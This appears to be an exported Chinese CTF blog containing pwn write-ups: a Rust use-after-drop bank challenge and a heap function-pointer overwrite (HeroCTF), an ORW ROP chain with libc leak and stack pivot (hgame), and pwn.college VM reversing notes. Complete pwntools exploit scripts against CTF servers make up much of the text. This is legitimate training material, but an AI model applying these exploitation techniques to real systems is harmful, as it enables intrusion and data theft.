<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>存款大于1337时show可以得到flag，但每次存款不得超过100，存储次数不得超过13</p>
<p>简单的银行账户管理系统，但是使用了unsafe，在内存管理方面没有 Rust 的安全保障。</p>
<p>于是有了这个漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 =&gt; &#123;</span><br><span class="line">    if opened &#123;</span><br><span class="line">        (*account).balance=0;</span><br><span class="line">        (*account).deposits = 0;</span><br><span class="line">        ptr::drop_in_place(account);</span><br><span class="line">        opened = false;</span><br><span class="line">        println!(&quot;BankRupst card removed.&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        println!(&quot;You must insert your BankRupst card!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">6 =&gt; &#123;</span><br><span class="line">    if opened &#123;</span><br><span class="line">        (*account).balance=0;</span><br><span class="line">        (*account).deposits = 0;</span><br><span class="line">        let layout = Layout::new::&lt;BankAccount&gt;();</span><br><span class="line">        dealloc(account as *mut u8, layout);</span><br><span class="line">        account = ptr::null_mut();</span><br><span class="line">        opened = false;</span><br><span class="line">        println!(&quot;Thank you for using BankRupst!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        println!(&quot;Thank you for using BankRupst!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>仔细观察5和6的区别，5在将元素置零后仅仅使用了<code>drop_in_place</code>并没有直接释放内存块</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>存款够13次后直接取出卡，再插卡，就会发现依旧有1300的存款</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;DEBUG&#x27;)</span><br><span class="line">#r=process(&#x27;./bankRupst&#x27;)</span><br><span class="line">r=remote(&quot;pwn.heroctf.fr&quot;,6001)</span><br><span class="line">s   = lambda x : r.send(x)</span><br><span class="line">sl  = lambda x : r.sendline(x)</span><br><span class="line">sa  = lambda x,y : r.sendafter(x, y)</span><br><span class="line">sla = lambda x,y : r.sendlineafter(x, y)</span><br><span class="line">rc  = lambda x : r.recv(x)</span><br><span class="line">ru  = lambda x : r.recvuntil(x)</span><br><span class="line">rcg = lambda : u64(rc(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(r.recvuntil(&quot;\x7f&quot;).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">ra = lambda : r.recvall(timeout=1)</span><br><span class="line">sla(&quot;option:&quot;,str(1))</span><br><span class="line">for i in range(0,13):</span><br><span class="line">    sla(&quot;option:&quot;,str(2))</span><br><span class="line">    sla(&quot;deposit?&quot;,str(100))</span><br><span class="line"></span><br><span class="line">sla(&quot;option:&quot;,str(5))</span><br><span class="line">sla(&quot;option:&quot;,str(1))</span><br><span class="line">sla(&quot;option:&quot;,str(4))</span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Heappie"><a href="#Heappie" class="headerlink" title="Heappie"></a>Heappie</h1><p>glibc:2.36(debian12u8)</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>简单的音乐播放器</p>
<p>堆结构，但是其实是指针覆写，各种保护齐开且不存在free，存在win函数</p>
<p>可能随机调用三个函数之一，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;Enter music description: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, music-&gt;description);</span><br></pre></td></tr></table></figure>

<p>可尝试覆写到函数指针</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;\t%d. %s by %s (song: %p)\n&quot;, i + 1, playlist[i].title, playlist[i].artist, playlist[i].play);</span><br></pre></td></tr></table></figure>

<p>泄露出pie基址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in [play1_sym, play2_sym, play3_sym]:</span><br><span class="line">    if (play_addr - i) % 0x100 == 0:</span><br><span class="line">        pie = play_addr - i</span><br><span class="line">        break</span><br><span class="line">win_addr = pie + elf.sym[&quot;win&quot;]</span><br></pre></td></tr></table></figure>

<p>playlist结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x /40gx playlist</span><br><span class="line">0x55555555c2a0: 0x000055555555527d      0x0000000000000061</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x000055555555527d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以覆写des到第二个的play函数，当“Do you want to add a sound to the music? (y&#x2F;n):”选择为n时不会设置play函数</p>
<p>所以exp为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;, log_level=&quot;DEBUG&quot;)</span><br><span class="line">filename = &quot;./heappie&quot;</span><br><span class="line">r = process(filename)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"># r = remote(&quot;pwn.heroctf.fr&quot;, 6001)</span><br><span class="line">s = lambda x: r.send(x)</span><br><span class="line">sl = lambda x: r.sendline(x)</span><br><span class="line">sa = lambda x, y: r.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: r.sendlineafter(x, y)</span><br><span class="line">rc = lambda x: r.recv(x)</span><br><span class="line">ru = lambda x: r.recvuntil(x)</span><br><span class="line">rcg = lambda: u64(rc(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">uu64 = lambda: u64(r.recvuntil(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_y(title, artist, description):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(y/n): &quot;, &quot;y&quot;)</span><br><span class="line">    sla(&quot;:&quot;, title)</span><br><span class="line">    sla(&quot;:&quot;, artist)</span><br><span class="line">    sla(&quot;:&quot;, description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_n(title, artist, description):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(y/n): &quot;, &quot;n&quot;)</span><br><span class="line">    sla(&quot;:&quot;, title)</span><br><span class="line">    sla(&quot;:&quot;, artist)</span><br><span class="line">    sla(&quot;:&quot;, description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">play1_sym = elf.sym[&quot;play_1&quot;]</span><br><span class="line">play2_sym = elf.sym[&quot;play_2&quot;]</span><br><span class="line">play3_sym = elf.sym[&quot;play_3&quot;]</span><br><span class="line"></span><br><span class="line">add_y(&quot;A&quot;, &quot;A&quot;, &quot;A&quot;)</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">play_addr = int(rc(12), 16)</span><br><span class="line">pie = 0</span><br><span class="line">for i in [play1_sym, play2_sym, play3_sym]:</span><br><span class="line">    if (play_addr - i) % 0x100 == 0:</span><br><span class="line">        pie = play_addr - i</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">win_addr = pie + elf.sym[&quot;win&quot;]</span><br><span class="line">payload = b&quot;a&quot; * (0x360 - 0x2E0) + p64(win_addr)</span><br><span class="line">add_n(&quot;a&quot;, &quot;a&quot;, payload)</span><br><span class="line">add_n(&quot;a&quot;, &quot;a&quot;, &quot;a&quot;)</span><br><span class="line"></span><br><span class="line">play(2)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br><span class="line">log.info(&quot;pie: &quot; + hex(pie))</span><br><span class="line">log.info(&quot;play_addr: &quot; + hex(play_addr))</span><br><span class="line">log.info(&quot;play1_sym: &quot; + hex(play1_sym))</span><br><span class="line">log.info(&quot;play2_sym: &quot; + hex(play2_sym))</span><br><span class="line">log.info(&quot;play3_sym: &quot; + hex(play3_sym))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Buafllet"><a href="#Buafllet" class="headerlink" title="Buafllet"></a>Buafllet</h1>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>hgameweek1-orw</title>
    <url>/2023/09/16/hgameweek1-orw/</url>
    <content><![CDATA[<p> 先泄露出libc基址，再往bss段写入payload，之后跳转到payload处即可</p>
<p>跳转payload有两种方法，一是控制rsp到payload处，控制程序流程</p>
<p>另一种是使用leave;ret跳转到payload处</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#控制rsp</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">context.os=&quot;linux&quot;</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28555)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=ELF(&quot;./libc-2.31.so&quot;)</span><br><span class="line">rop=ROP(&quot;./libc-2.31.so&quot;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">open(&quot;flag&quot;)</span><br><span class="line">read(3,flag_addr,0x100)</span><br><span class="line">write(1,flag_addr,0x100)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">leave_ret=0x00000000004012be</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">pop_rdi=0x0000000000401393</span><br><span class="line">pop_rsi_r15=0x0000000000401391</span><br><span class="line">flag_addr=0x404b00</span><br><span class="line">ebp=0x404600</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x108+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&quot;main&quot;])</span><br><span class="line">r.sendlineafter(&quot;task.\n&quot;,payload)</span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">lb=puts_addr-libc.sym[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">pop_rdi_lb=lb+rop.find_gadget([&quot;pop rdi&quot;,&quot;ret&quot;])[0]</span><br><span class="line">pop_rsi=lb+rop.find_gadget([&quot;pop rsi&quot;,&quot;ret&quot;])[0]</span><br><span class="line">pop_rdx=lb+rop.find_gadget([&quot;pop rdx&quot;,&quot;ret&quot;])[0]</span><br><span class="line">pop_rsp=lb+rop.find_gadget([&quot;pop rsp&quot;,&quot;ret&quot;])[0]</span><br><span class="line">syscall_ret = lb + rop.find_gadget([&#x27;syscall&#x27;,&#x27;ret&#x27;])[0]</span><br><span class="line">open_ret=lb+libc.sym[&quot;open&quot;]</span><br><span class="line">write_ret=lb+libc.sym[&quot;write&quot;]</span><br><span class="line">read_ret=lb+libc.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x108+p64(pop_rsi)+p64(ebp)+p64(lb+libc.sym[&quot;read&quot;])+p64(elf.sym[&quot;main&quot;])</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&quot;task.\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_lb)+p64(ebp+0x78)+p64(pop_rsi)+p64(0)+p64(open_ret)</span><br><span class="line">payload+=p64(pop_rdi_lb)+p64(3)+p64(pop_rsi)+p64(ebp+0x300)+p64(pop_rdx)+p64(0x100)+p64(read_ret)</span><br><span class="line">payload+=p64(pop_rdi_lb)+p64(1)+p64(write_ret)+b&quot;/flag\x00\x00&quot;</span><br><span class="line"></span><br><span class="line"># stack--&gt;bss</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.sendlineafter(&quot;task.\n&quot;,b&quot;a&quot;*0x108+p64(pop_rsp)+p64(ebp))</span><br><span class="line">print(r.recvall())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用leave;ret</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">context.os=&quot;linux&quot;</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">#r=remote(&quot;node5.anna.nssctf.cn&quot;,28555)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=ELF(&quot;./libc-2.31.so&quot;)</span><br><span class="line">rop=ROP(&quot;./libc-2.31.so&quot;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">open(&quot;flag&quot;)</span><br><span class="line">read(3,flag_addr,0x100)</span><br><span class="line">write(1,flag_addr,0x100)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">leave_ret=0x00000000004012be</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">pop_rdi=0x0000000000401393</span><br><span class="line">pop_rsi_r15=0x0000000000401391</span><br><span class="line">flag_addr=0x404b00</span><br><span class="line">ebp=0x404600</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x108+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&quot;main&quot;])</span><br><span class="line">r.sendlineafter(&quot;task.\n&quot;,payload)</span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">lb=puts_addr-libc.sym[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">pop_rdi_lb=lb+rop.find_gadget([&quot;pop rdi&quot;,&quot;ret&quot;])[0]</span><br><span class="line">pop_rsi=lb+rop.find_gadget([&quot;pop rsi&quot;,&quot;ret&quot;])[0]</span><br><span class="line">pop_rdx=lb+rop.find_gadget([&quot;pop rdx&quot;,&quot;ret&quot;])[0]</span><br><span class="line">pop_rsp=lb+rop.find_gadget([&quot;pop rsp&quot;,&quot;ret&quot;])[0]</span><br><span class="line">syscall_ret = lb + rop.find_gadget([&#x27;syscall&#x27;,&#x27;ret&#x27;])[0]</span><br><span class="line">open_ret=lb+libc.sym[&quot;open&quot;]</span><br><span class="line">write_ret=lb+libc.sym[&quot;write&quot;]</span><br><span class="line">read_ret=lb+libc.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x100+p64(ebp+0x100)+p64(0x4012CF)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&quot;task.\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">payload=b&quot;./flag\x00\x00&quot;+p64(pop_rdi_lb)+p64(ebp)+p64(pop_rsi)+p64(0)+p64(open_ret)</span><br><span class="line">payload+=p64(pop_rdi_lb)+p64(3)+p64(pop_rsi)+p64(ebp+0x300)+p64(pop_rdx)+p64(0x100)+p64(read_ret)</span><br><span class="line">payload+=p64(pop_rdi_lb)+p64(1)+p64(write_ret)</span><br><span class="line">payload=payload.ljust(0x100,b&quot;\x00&quot;)</span><br><span class="line"># stack--&gt;bss</span><br><span class="line">#payload=payload.ljust(0x100,b&quot;\x00&quot;)</span><br><span class="line">payload+=p64(ebp)+p64(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">print(r.recvall())</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn-college-Reverse-Engineering</title>
    <url>/2024/10/31/pwn-college-Reverse-Engineering/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>pwncollege的逆向模块，前几题ida基本上可以直接看出来，或者pwndbg动调出来，直到6.0开始就是比较多的逆向，其实无非是异或，换位，排序，反序，对着源代码写写py就出来了</p>
<h1 id="12-0-x2F-12-1"><a href="#12-0-x2F-12-1" class="headerlink" title="12.0&#x2F;12.1"></a>12.0&#x2F;12.1</h1><p>从这里开始就变成了vm题，当然，是很简单的vm题</p>
<h1 id="13-0"><a href="#13-0" class="headerlink" title="13.0"></a>13.0</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[s] IMM b = 0x88</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM a = 0xb</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x3a</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x69</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xce</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br></pre></td></tr></table></figure>

<p>给了这一串式子，最后结果其实是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1 = memcmp((a1 + 136), (a1 + 104), 4uLL);</span><br></pre></td></tr></table></figure>

<p>在这个地方进行判断，跟前面题差不多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMM :  	给寄存器赋值</span><br><span class="line">ADD :	寄存器相加</span><br><span class="line">STM :	类似于mov</span><br><span class="line">例如：</span><br><span class="line">IMM b = 0x88</span><br><span class="line">STM *b = a</span><br><span class="line">就是*b指针指向a</span><br></pre></td></tr></table></figure>

<p>很容易计算出结果</p>
<h1 id="13-1"><a href="#13-1" class="headerlink" title="13.1"></a>13.1</h1><p>本关没有输出了，要自己判断做了什么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_1533(a1, 64LL, 146LL);</span><br><span class="line">sub_1533(a1, 32LL, 1LL);</span><br><span class="line">sub_1533(a1, 4LL, 233LL);</span><br><span class="line">sub_1687(a1, 64LL, 4LL);</span><br><span class="line">sub_1568(a1, 64LL, 32LL);</span><br><span class="line">sub_1533(a1, 4LL, 66LL);</span><br><span class="line">sub_1687(a1, 64LL, 4LL);</span><br><span class="line">sub_1568(a1, 64LL, 32LL);</span><br><span class="line">sub_1533(a1, 4LL, 29LL);</span><br><span class="line">sub_1687(a1, 64LL, 4LL);</span><br><span class="line">sub_1568(a1, 64LL, 32LL);</span><br><span class="line">sub_1533(a1, 4LL, 159LL);</span><br><span class="line">sub_1687(a1, 64LL, 4LL);</span><br><span class="line">sub_1568(a1, 64LL, 32LL);</span><br></pre></td></tr></table></figure>

<p>先推测sub_1533是IMM</p>
<p>进入1687内部</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v3 = sub_1363(a1, a3);</span><br><span class="line">v4 = sub_1363(a1, a2);</span><br><span class="line">return sub_1507(a1, v4, v3);</span><br></pre></td></tr></table></figure>

<p>再进入1363</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch ( a2 )</span><br><span class="line">&#123;</span><br><span class="line">  case 4:</span><br><span class="line">    return a1[256];</span><br><span class="line">  case 64:</span><br><span class="line">    return a1[257];</span><br><span class="line">  case 32:</span><br><span class="line">    return a1[258];</span><br><span class="line">  case 8:</span><br><span class="line">    return a1[259];</span><br><span class="line">  case 16:</span><br><span class="line">    return a1[260];</span><br><span class="line">  case 2:</span><br><span class="line">    return a1[261];</span><br><span class="line">&#125;</span><br><span class="line">if ( a2 != 1 )</span><br><span class="line">  sub_1269(a1, &quot;unknown register&quot;);</span><br><span class="line">return a1[262];</span><br></pre></td></tr></table></figure>

<p>寄存器分配地址</p>
<p>再看1507</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = a2;</span><br><span class="line">*(a1 + a2) = a3;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>

<p>使a2指针指向a3，相当于STM </p>
<p>那么1568就是ADD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMM A=0X92</span><br><span class="line">IMM B=0X1</span><br><span class="line">IMM C=0XE9</span><br><span class="line">STM *A=C</span><br><span class="line">ADD A,B</span><br><span class="line">IMM C=0X42</span><br><span class="line">STM *A=C</span><br><span class="line">ADD A,B</span><br><span class="line">IMM C=0X1D</span><br><span class="line">STM *A=C</span><br><span class="line">ADD A,B</span><br><span class="line">IMM C=9F</span><br><span class="line">STM *A=C</span><br><span class="line">ADD A,B</span><br></pre></td></tr></table></figure>

<h1 id="14-0"><a href="#14-0" class="headerlink" title="14.0"></a>14.0</h1><p>这次不同的是多了一个sys，模拟的是syscall系统调用</p>
<p>而且只能读取0x6，但是没什么影响</p>
<h1 id="14-1"><a href="#14-1" class="headerlink" title="14.1"></a>14.1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_1533(a1, 32LL, 109LL);</span><br><span class="line">sub_1533(a1, 4LL, 8LL);</span><br><span class="line">sub_1533(a1, 64LL, 0LL);</span><br><span class="line">sub_1896(a1, 2, 0x40u);</span><br><span class="line">sub_1533(a1, 32LL, 141LL);</span><br><span class="line">sub_1533(a1, 4LL, 1LL);</span><br><span class="line">sub_1533(a1, 64LL, 105LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 230LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 146LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 65LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 214LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 24LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 253LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br><span class="line">sub_1533(a1, 64LL, 97LL);</span><br><span class="line">sub_1687(a1, 32LL, 64LL);</span><br><span class="line">sub_1568(a1, 32LL, 4LL);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMM B, 109LL</span><br><span class="line">IMM C, 8LL</span><br><span class="line">IMM A, 0LL</span><br><span class="line">SYS 2, 0x40u</span><br><span class="line">IMM B, 141LL</span><br><span class="line">IMM C, 1LL</span><br><span class="line">IMM A, 105LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 230LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 146LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 65LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 214LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 24LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 253LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br><span class="line">IMM A, 97LL</span><br><span class="line">STM *B, A</span><br><span class="line">ADD B, C</span><br></pre></td></tr></table></figure>

<h1 id="15-0"><a href="#15-0" class="headerlink" title="15.0"></a>15.0</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[s] IMM b = 0x46</span><br><span class="line">[s] IMM c = 0x4</span><br><span class="line">[s] IMM a = 0</span><br><span class="line">[s] SYS 0x8 a</span><br><span class="line">[s] ... read_memory</span><br><span class="line">1</span><br><span class="line">[s] ... return value (in register a): 0x2</span><br><span class="line">[s] IMM b = 0x66</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM a = 0x41</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xc7</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xad</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xeb</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[s] IMM b = 0</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM d = 0x49</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">I[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x4e</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">N[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x43</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">C[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x4f</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">O[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x52</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">R[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x52</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">R[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x45</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">E[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x43</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">C[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x54</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">T[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x21</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line">![s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[s] IMM d = 0xa</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... write</span><br><span class="line"></span><br><span class="line">[s] ... return value (in register a): 0x1</span><br><span class="line">[s] SYS 0x10 a</span><br><span class="line">[s] ... exit</span><br></pre></td></tr></table></figure>

<p>15.0更有意思了，不光有sys_read, 还有write和exit</p>
<p>其实解法还是没变</p>
<h1 id="15-1"><a href="#15-1" class="headerlink" title="15.1"></a>15.1</h1><p>没有提示的15.0，但看源码还是老样子，</p>
